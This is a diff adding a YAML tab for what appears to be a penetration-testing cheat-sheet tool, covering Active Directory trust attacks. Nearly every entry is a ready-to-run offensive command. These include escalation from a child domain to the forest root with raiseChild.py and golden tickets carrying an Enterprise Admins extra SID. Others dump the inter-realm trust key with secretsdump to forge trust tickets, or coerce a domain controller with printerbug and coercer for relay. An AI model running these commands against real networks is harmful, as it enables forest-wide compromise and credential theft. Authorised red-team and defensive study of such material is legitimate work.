@@ -1,0 +1,67 @@
+tab: trusts
+title: Trusts
+order: 50
+blurb: >
+  Enumerate domain/forest trusts and cross the boundary. Child->parent within a
+  forest is a well-known escalation via the krbtgt + extra-SID.
+
+sections:
+
+  - name: Enumerate trusts
+    hint: Map who trusts whom and in which direction.
+    steps:
+      - text: From Linux
+        cmds:
+          - "nxc ldap $RHOST -u $USER -p $PASS -M enum_trusts"
+          - "impacket-lookupsid $DOMAIN/$USER:$PASS@$RHOST 0"
+      - text: From a domain host (PowerView)
+        flags: [win]
+        cmds:
+          - "Get-DomainTrust"
+          - "Get-DomainTrustMapping"
+          - "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"
+
+  - name: Child -> parent (intra-forest)
+    hint: Compromised a child domain — escalate to forest root via SID history.
+    steps:
+      - text: Automatic (raiseChild)
+        flags: [admin]
+        cmds:
+          - "raiseChild.py $DOMAIN/$USER:$PASS"
+      - text: Manual golden ticket with extra-SID
+        cmds:
+          - "impacket-ticketer -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain $DOMAIN -extra-sid <parent_sid>-519 fakeadmin"
+
+  - name: Cross-forest (trust key)
+    hint: Use the inter-realm trust key to forge a referral ticket into the trusting domain.
+    steps:
+      - text: Dump trust key, forge trust ticket
+        cmds:
+          - "impacket-secretsdump -just-dc-user '<domain>$' $DOMAIN/$USER:$PASS@$RHOST"
+          - "impacket-ticketer -nthash <trust_key> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-519 -spn krbtgt/<domain_b> trustfakeuser"
+
+  - name: Foreign principals
+    hint: Accounts/groups from one domain with rights in another — cross-boundary footholds.
+    steps:
+      - text: Find foreign group membership
+        flags: [win]
+        cmds:
+          - "Get-DomainForeignGroupMember -Domain <target_domain>"
+          - "Find-ForeignGroup -Domain <target_domain>"
+
+  - name: Cross-domain coercion / relay
+    hint: Coerce a DC in one domain to authenticate, relay into the other.
+    steps:
+      - text: Coerce DC-B from DC-A
+        flags: [opsec]
+        cmds:
+          - "printerbug.py <domain_a>/$USER:$PASS@<dc_a> <dc_b>"
+          - "coercer coerce -u $USER -p '$PASS' -d <domain_a> -l <dc_b> -t <dc_a>"
+
+  - name: MSSQL trusted links across domains
+    hint: Linked SQL servers can bridge trust boundaries with exec.
+    steps:
+      - text: Crawl links to the far domain
+        flags: [win]
+        cmds:
+          - "Get-SQLServerLinkCrawl -Instance <sqlserver> -Query 'SELECT SYSTEM_USER'"
